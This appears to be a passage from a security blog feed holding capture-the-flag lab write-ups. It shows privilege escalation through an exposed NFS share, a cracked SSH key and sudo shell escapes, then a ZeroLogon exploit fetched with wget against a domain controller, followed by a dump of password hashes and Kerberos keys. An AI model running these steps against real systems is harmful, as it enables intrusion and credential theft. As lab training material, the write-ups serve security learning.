<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install nfs-common
showmount -e 172.31.1.7
Export list <span style="color:#ff79c6">for</span> 172.31.1.7:
/home/amir *.*.*.*
</code></pre></td></tr></table>
</div>
</div><p>We can mount amir home folder:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mount -t nfs4  172.31.1.7:/home/amir ./shares

ls -la /tmp/shares/.ssh
drwxrwxr-x  <span style="color:#bd93f9">2</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .
drwxrwxr-x  <span style="color:#bd93f9">5</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> ..
-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>   <span style="color:#bd93f9">393</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> authorized_keys
-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1766</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa
-rw-r--r--  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1766</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa.bak
-r--------  <span style="color:#bd93f9">1</span> <span style="color:#bd93f9">1000</span>  <span style="color:#bd93f9">1000</span>   <span style="color:#bd93f9">393</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> id_rsa.pub
</code></pre></td></tr></table>
</div>
</div><p>We try to ssh with the rsa key but it is protected with a passphrase</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">chmod <span style="color:#bd93f9">700</span> id_rsa.bak
ssh -i id_rsa.bak amir@172.31.1.7 -p <span style="color:#bd93f9">27853</span>
Enter passphrase <span style="color:#ff79c6">for</span> key <span style="color:#f1fa8c">&#39;id_rsa.bak&#39;</span>:
</code></pre></td></tr></table>
</div>
</div><p>We can extract the hash and crack it with john</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/john/run/ssh2john.py id_rsa.bak &gt; <span style="color:#8be9fd;font-style:italic">hash</span>
/opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt --rules <span style="color:#8be9fd;font-style:italic">hash</span>
/opt/john/run/john --show <span style="color:#8be9fd;font-style:italic">hash</span>
id_rsa.bak:hello6
</code></pre></td></tr></table>
</div>
</div><p>We can now login ssh</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i id_rsa.bak amir@172.31.1.7 -p <span style="color:#bd93f9">27853</span>
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
amir@shares:~$ ls -la
total <span style="color:#bd93f9">40</span>
drwxrwxr-x <span style="color:#bd93f9">5</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .
drwxr-xr-x <span style="color:#bd93f9">4</span> root root <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> ..
-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir    <span style="color:#bd93f9">0</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .bash_history
-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir  <span style="color:#bd93f9">220</span> Apr  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2018</span> .bash_logout
-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir <span style="color:#bd93f9">3786</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .bashrc
drw-r--r-- <span style="color:#bd93f9">2</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .cache
drw-r--r-- <span style="color:#bd93f9">3</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .gnupg
-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir  <span style="color:#bd93f9">807</span> Apr  <span style="color:#bd93f9">4</span>  <span style="color:#bd93f9">2018</span> .profile
drwxrwxr-x <span style="color:#bd93f9">2</span> amir amir <span style="color:#bd93f9">4096</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .ssh
-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir    <span style="color:#bd93f9">0</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .sudo_as_admin_successful
-rw-r--r-- <span style="color:#bd93f9">1</span> amir amir <span style="color:#bd93f9">7713</span> Apr  <span style="color:#bd93f9">2</span>  <span style="color:#bd93f9">2020</span> .viminfo
</code></pre></td></tr></table>
</div>
</div><h1 id="shell-as-amy">Shell as amy</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">amir@shares:~$ sudo -l
Matching Defaults entries <span style="color:#ff79c6">for</span> amir on shares:
    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User amir may run the following commands on shares:
    <span style="color:#ff79c6">(</span>ALL : ALL<span style="color:#ff79c6">)</span> ALL
    <span style="color:#ff79c6">(</span>amy<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/pkexec
    <span style="color:#ff79c6">(</span>amy<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/python3
amir@shares:~$ sudo -u amy /usr/bin/python3 -c <span style="color:#f1fa8c">&#39;import os; os.system(&#34;/bin/bash&#34;)&#39;</span>
amy@shares:~$
</code></pre></td></tr></table>
</div>
</div><h1 id="shell-as-root">Shell as root</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">amy@shares:~$ sudo -l
Matching Defaults entries <span style="color:#ff79c6">for</span> amy on shares:
    env_reset, mail_badpass, <span style="color:#8be9fd;font-style:italic">secure_path</span><span style="color:#ff79c6">=</span>/usr/local/sbin<span style="color:#f1fa8c">\:</span>/usr/local/bin<span style="color:#f1fa8c">\:</span>/usr/sbin<span style="color:#f1fa8c">\:</span>/usr/bin<span style="color:#f1fa8c">\:</span>/sbin<span style="color:#f1fa8c">\:</span>/bin<span style="color:#f1fa8c">\:</span>/snap/bin

User amy may run the following commands on shares:
    <span style="color:#ff79c6">(</span>ALL<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/ssh
amy@shares:~$ sudo /usr/bin/ssh -o <span style="color:#8be9fd;font-style:italic">ProxyCommand</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;;bash 0&lt;&amp;2 1&gt;&amp;2&#39;</span> x
root@shares:~# <span style="color:#8be9fd;font-style:italic">cd</span> /root
root@shares:/root# ls
system.txt
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>CSL - Zero</title><link>https://0xade1.github.io/posts/2021/08/csl-zero/</link><pubDate>Sun, 22 Aug 2021 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/08/csl-zero/</guid><description>Exploration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 sudo nmap 172.31.1.29 Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-21 22:27 HKT Nmap scan report for 172.31.1.29 Host is up (0.10s latency). Not shown: 988 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server Nmap done: 1 IP address (1 host up) scanned in 19.</description><content type="html"><![CDATA[<h1 id="exploration">Exploration</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap 172.31.1.29
Starting Nmap 7.80 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2021-08-21 22:27 HKT
Nmap scan report <span style="color:#ff79c6">for</span> 172.31.1.29
Host is up <span style="color:#ff79c6">(</span>0.10s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">988</span> filtered ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 19.75 seconds
</code></pre></td></tr></table>
</div>
</div><p>Explore samba shares</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -L <span style="color:#f1fa8c">\\</span>172.31.1.29 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
</code></pre></td></tr></table>
</div>
</div><p>while running a more detailed nmap scans:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p135,445,139,3389,53,88,389,464,593,636,3268,3269,3389 -Pn -sC -sV -T4 -v 172.31.1.29
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: ZERO
|   NetBIOS_Domain_Name: ZERO
|   NetBIOS_Computer_Name: ZERO-DC
|   DNS_Domain_Name: Zero.csl
|   DNS_Computer_Name: Zero-DC.Zero.csl
|   DNS_Tree_Name: Zero.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-21T15:52:48+00:00
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>This is a Domain admin controller, it may be vulnerable to <a href="https://www.cynet.com/zerologon">ZeroLogon</a>
vulnerability to set an empty password for that account in the domain: an exploit is available but requires python3-impacket</p>
<h1 id="zerologon-exploitation">Zerologon Exploitation</h1>
<p>install impacket</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m pip install virtualenv
python3 -m virtualenv v3
<span style="color:#8be9fd;font-style:italic">source</span> v3/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
</code></pre></td></tr></table>
</div>
</div><p>Download and execute the exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py
python cve-2020-1472-exploit.py ZERO-DC 172.31.1.29
</code></pre></td></tr></table>
</div>
</div><p>output shows we successfully reset the Administrator password:</p>
<pre tabindex="0"><code>Performing authentication attempts...
===============================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
</code></pre><h1 id="impacket">impacket</h1>
<p>A guide is available here: <a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p>
<p>We first need to dump some secrets before we can logon the remote machine:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">impacket-secretsdump -no-pass -just-dc zero/<span style="color:#f1fa8c">&#39;ZERO-DC$&#39;</span>@172.31.1.29
</code></pre></td></tr></table>
</div>
</div><p>output:</p>
<pre><code>Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a190af9837b4381407a3b689e0c839cf:::
jared:1104:aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990:::
ZERO-DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:1bf898538a3b6eeb9b89cf68995e5463053a979f1a898138d39315685c978e96
Administrator:aes128-cts-hmac-sha1-96:a938e7b92eb1348102d819e12ce42637
Administrator:des-cbc-md5:b9f8f4aba129fd37
krbtgt:aes256-cts-hmac-sha1-96:5668dbe3fa1b0d62052045f6d87e37189746f11d05df8c59c1b107ca524883f1
krbtgt:aes128-cts-hmac-sha1-96:fea193d0c59da8e5bbaee22020394fdc
krbtgt:des-cbc-md5:92611373c257c71f
jared:aes256-cts-hmac-sha1-96:1ba68250e533e74ad85cc920f1c827cb9766a6d335a79f7764ce4439cce7f252
jared:aes128-cts-hmac-sha1-96:8946e418c70e2c8669f795a094c99f9e
jared:des-cbc-md5:f8438fc1a4e3162a
ZERO-DC$:aes256-cts-hmac-sha1-96:458cb41c4271c035ae1a9188a4262f00e9dbf94cafc9f5725061d27685eabca4
ZERO-DC$:aes128-cts-hmac-sha1-96:ab9cc7c32dfef381832477eb1ce0cb29
